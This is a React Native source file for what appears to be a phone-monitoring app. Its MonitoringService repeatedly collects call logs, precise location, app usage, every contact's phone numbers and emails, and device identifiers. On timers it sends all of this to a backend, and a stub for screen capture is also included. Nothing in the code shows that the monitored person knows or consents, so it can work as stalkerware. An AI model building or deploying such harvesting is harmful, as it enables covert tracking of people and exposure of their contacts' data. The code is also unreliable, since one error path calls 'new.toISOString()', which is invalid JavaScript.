/**
 * MonitoringService - Core monitoring functionality
 * Handles all data collection from the device
 */

import { Platform, PermissionsAndroid } from 'react-native';
import CallLog from 'react-native-call-log';
import Contacts from 'react-native-contacts';
import Geolocation from 'react-native-geolocation-service';
import DeviceInfo from 'react-native-device-info';
import AppUsage from 'react-native-app-usage';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { ApiService } from './ApiService';

class MonitoringService {
  constructor() {
    this.isMonitoring = false;
    this.intervals = {};
    this.lastSyncTimes = {};
  }

  async startAll() {
    console.log('Starting all monitoring services...');
    
    try {
      this.isMonitoring = true;
      
      // Start different monitoring services
      await this.startCallLogMonitoring();
      await this.startLocationMonitoring();
      await this.startAppUsageMonitoring();
      await this.startContactsMonitoring();
      
      console.log('All monitoring services started successfully');
      return true;
    } catch (error) {
      console.error('Failed to start monitoring services:', error);
      return false;
    }
  }

  async stopAll() {
    console.log('Stopping all monitoring services...');
    
    this.isMonitoring = false;
    
    // Clear all intervals
    Object.keys(this.intervals).forEach(key => {
      if (this.intervals[key]) {
        clearInterval(this.intervals[key]);
        delete this.intervals[key];
      }
    });
    
    console.log('All monitoring services stopped');
  }

  // Call Log Monitoring
  async startCallLogMonitoring() {
    if (Platform.OS !== 'android') {
      console.log('Call log monitoring only available on Android');
      return;
    }

    const syncCallLogs = async () => {
      try {
        const hasPermission = await PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
        );

        if (!hasPermission) {
          console.log('Call log permission not granted');
          return;
        }

        const lastSync = await AsyncStorage.getItem('last_call_sync');
        const filter = lastSync ? { minTimestamp: parseInt(lastSync) } : { limit: 50 };
        
        const callLogs = await CallLog.load(-1, filter);
        
        if (callLogs && callLogs.length > 0) {
          console.log(`Found ${callLogs.length} new call logs`);
          
          const formattedLogs = callLogs.map(call => ({
            phoneNumber: call.phoneNumber,
            name: call.name || 'Unknown',
            timestamp: new Date(call.timestamp).toISOString(),
            duration: call.duration,
            type: this.getCallType(call.type),
            rawLogTimestamp: call.rawLogTimestamp
          }));

          // Send to backend
          await ApiService.syncCallLogs(formattedLogs);
          
          // Update last sync time
          const latestTimestamp = Math.max(...callLogs.map(c => c.timestamp));
          await AsyncStorage.setItem('last_call_sync', latestTimestamp.toString());
        }
      } catch (error) {
        console.error('Call log sync error:', error);
      }
    };

    // Initial sync
    await syncCallLogs();
    
    // Set up periodic sync (every 2 minutes)
    this.intervals.callLogs = setInterval(syncCallLogs, 2 * 60 * 1000);
  }

  getCallType(type) {
    switch (type) {
      case '1': return 'incoming';
      case '2': return 'outgoing';
      case '3': return 'missed';
      default: return 'unknown';
    }
  }

  // Location Monitoring
  async startLocationMonitoring() {
    const syncLocation = async () => {
      try {
        const hasPermission = Platform.OS === 'android' 
          ? await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION)
          : true; // iOS permission handled differently

        if (!hasPermission) {
          console.log('Location permission not granted');
          return;
        }

        Geolocation.getCurrentPosition(
          async (position) => {
            const locationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date(position.timestamp).toISOString(),
              speed: position.coords.speed || 0,
              heading: position.coords.heading || 0
            };

            console.log('Location updated:', locationData);
            await ApiService.syncLocation(locationData);
          },
          (error) => {
            console.error('Location error:', error);
          },
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 10000
          }
        );
      } catch (error) {
        console.error('Location sync error:', error);
      }
    };

    // Initial location
    await syncLocation();
    
    // Set up periodic location updates (every 5 minutes)
    this.intervals.location = setInterval(syncLocation, 5 * 60 * 1000);
  }

  // App Usage Monitoring
  async startAppUsageMonitoring() {
    if (Platform.OS !== 'android') {
      console.log('App usage monitoring only available on Android');
      return;
    }

    const syncAppUsage = async () => {
      try {
        // Get app usage statistics for the last 24 hours
        const endTime = Date.now();
        const startTime = endTime - (24 * 60 * 60 * 1000); // 24 hours ago

        const usageStats = await AppUsage.getAppUsage(startTime, endTime);
        
        if (usageStats && usageStats.length > 0) {
          console.log(`Found usage data for ${usageStats.length} apps`);
          
          const formattedUsage = usageStats.map(app => ({
            packageName: app.packageName,
            appName: app.appName || app.packageName,
            totalTimeInForeground: app.totalTimeInForeground,
            firstTimeStamp: new Date(app.firstTimeStamp).toISOString(),
            lastTimeStamp: new Date(app.lastTimeStamp).toISOString(),
            lastTimeUsed: new Date(app.lastTimeUsed).toISOString()
          }));

          await ApiService.syncAppUsage(formattedUsage);
        }
      } catch (error) {
        console.error('App usage sync error:', error);
      }
    };

    // Initial sync
    await syncAppUsage();
    
    // Set up periodic sync (every 30 minutes)
    this.intervals.appUsage = setInterval(syncAppUsage, 30 * 60 * 1000);
  }

  // Contacts Monitoring
  async startContactsMonitoring() {
    const syncContacts = async () => {
      try {
        const hasPermission = Platform.OS === 'android'
          ? await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_CONTACTS)
          : true;

        if (!hasPermission) {
          console.log('Contacts permission not granted');
          return;
        }

        const contacts = await Contacts.getAll();
        
        if (contacts && contacts.length > 0) {
          console.log(`Found ${contacts.length} contacts`);
          
          const formattedContacts = contacts.map(contact => ({
            recordID: contact.recordID,
            displayName: contact.displayName,
            givenName: contact.givenName,
            familyName: contact.familyName,
            phoneNumbers: contact.phoneNumbers.map(phone => ({
              label: phone.label,
              number: phone.number
            })),
            emailAddresses: contact.emailAddresses.map(email => ({
              label: email.label,
              email: email.email
            }))
          }));

          await ApiService.syncContacts(formattedContacts);
        }
      } catch (error) {
        console.error('Contacts sync error:', error);
      }
    };

    // Initial sync
    await syncContacts();
    
    // Set up periodic sync (every hour)
    this.intervals.contacts = setInterval(syncContacts, 60 * 60 * 1000);
  }

  // Device Information Monitoring
  async getDeviceInfo() {
    try {
      const deviceInfo = {
        deviceId: await DeviceInfo.getUniqueId(),
        deviceName: await DeviceInfo.getDeviceName(),
        brand: DeviceInfo.getBrand(),
        model: DeviceInfo.getModel(),
        systemName: DeviceInfo.getSystemName(),
        systemVersion: DeviceInfo.getSystemVersion(),
        buildNumber: DeviceInfo.getBuildNumber(),
        bundleId: DeviceInfo.getBundleId(),
        appVersion: DeviceInfo.getVersion(),
        buildVersion: DeviceInfo.getBuildNumber(),
        isEmulator: await DeviceInfo.isEmulator(),
        isTablet: DeviceInfo.isTablet(),
        totalMemory: await DeviceInfo.getTotalMemory(),
        usedMemory: await DeviceInfo.getUsedMemory(),
        batteryLevel: await DeviceInfo.getBatteryLevel(),
        isCharging: await DeviceInfo.isBatteryCharging(),
        ipAddress: await DeviceInfo.getIpAddress(),
        macAddress: await DeviceInfo.getMacAddress(),
        carrier: await DeviceInfo.getCarrier(),
        timestamp: new Date().toISOString()
      };

      return deviceInfo;
    } catch (error) {
      console.error('Device info collection error:', error);
      return null;
    }
  }

  // Network Monitoring
  async monitorNetworkActivity() {
    // This would require more advanced native modules
    // For now, we'll implement basic connectivity checking
    try {
      const response = await fetch('https://www.google.com', {
        method: 'HEAD',
        timeout: 5000
      });
      
      return {
        isConnected: response.ok,
        timestamp: new Date().toISOString(),
        connectionType: 'unknown' // Would need NetInfo module for detailed info
      };
    } catch (error) {
      return {
        isConnected: false,
        timestamp: new.toISOString(),
        error: error.message
      };
    }
  }

  // Screenshot capability (requires native implementation)
  async captureScreen() {
    // This would require native implementation for security
    console.log('Screen capture requested - requires native implementation');
    return null;
  }

  // Get current status
  getStatus() {
    return {
      isMonitoring: this.isMonitoring,
      activeServices: Object.keys(this.intervals),
      lastSyncTimes: this.lastSyncTimes
    };
  }
}

export default new MonitoringService();